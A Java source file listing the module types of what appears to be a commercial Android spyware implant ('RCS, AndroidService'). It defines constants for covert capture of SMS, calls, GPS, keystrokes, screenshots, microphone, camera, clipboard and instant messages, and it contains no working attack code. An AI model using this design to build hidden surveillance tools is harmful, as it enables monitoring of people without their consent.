/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentType.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

public abstract class AgentType {
	public static final int BASE = 0x1000;

	public final static int AGENT_INFO = BASE + 0x0;
	public final static int AGENT_SMS = BASE + 0x1; // Agente di cattura delle
													// Email/Sms/Mms
	public final static int AGENT_TASK = BASE + 0x2; // Agente per la cattura
														// degli appuntamenti
	public final static int AGENT_CALLLIST = BASE + 0x3; // Agente per la
															// cattura della
															// lista delle
	// chiamate
	public final static int AGENT_DEVICE = BASE + 0x4; // Agente per la cattura
														// delle informazioni
	// sul device
	public final static int AGENT_POSITION = BASE + 0x5; // Agente per la
															// cattura della
															// posizione
	// GPS o celle GSM
	public final static int AGENT_CALL = BASE + 0x6; // Agente per la cattura
														// delle chiamate con
	// conference call
	public final static int AGENT_CALL_LOCAL = BASE + 0x7; // Agente per la
															// registrazione in
															// situ
	// delle chiamate

	public final static int AGENT_KEYLOG = BASE + 0x8; // Agente per la cattura
														// dei tasti battuti
	// su tastiera
	public final static int AGENT_SNAPSHOT = BASE + 0x9; // Agente per la
															// cattura degli
															// snapshot
	// delloschermo
	public final static int AGENT_URL = BASE + 0xa; // Agente per la cattura
													// degli URL visitati

	public final static int AGENT_IM = BASE + 0xb; // Agente per la cattura
													// degli IM
	public final static int AGENT_EMAIL = BASE + 0xc; // Non utilizzato (fa
														// tutto AGENT_SMS)
	public final static int AGENT_MIC = BASE + 0xd; // Agente per la cattura del
													// microfono
	public final static int AGENT_CAM = BASE + 0xe; // Agente per la cattura
													// degli snapshot dalle
													// webcam
	public final static int AGENT_CLIPBOARD = BASE + 0xf; // Agente per la
															// cattura degli
															// appunti
	public final static int AGENT_CRISIS = BASE + 0x10; // Agente di Crisis
	public final static int AGENT_APPLICATION = BASE + 0x11; // Agente per la
																// cattura delle
																// applicazioni
																// avviate o
	// fermate
	public final static int AGENT_LIVEMIC = BASE + 0x12;

	// public final static int AGENT_PDA = 0xDF7A; // Solo per PC (infection
	// agent)

	public final static int FIRST = AGENT_INFO;
	public final static int LAST = AGENT_LIVEMIC;

	static int[] values;

	public static int[] values() {
		if (values == null) {
			final int size = LAST - FIRST + 1;
			values = new int[size];
			for (int i = FIRST; i <= LAST; i++) {
				values[i - FIRST] = i;
			}
		}
		return values;
	}

	public static boolean isValid(int typeId) {
		return typeId >= FIRST && typeId <= LAST;
	}
}
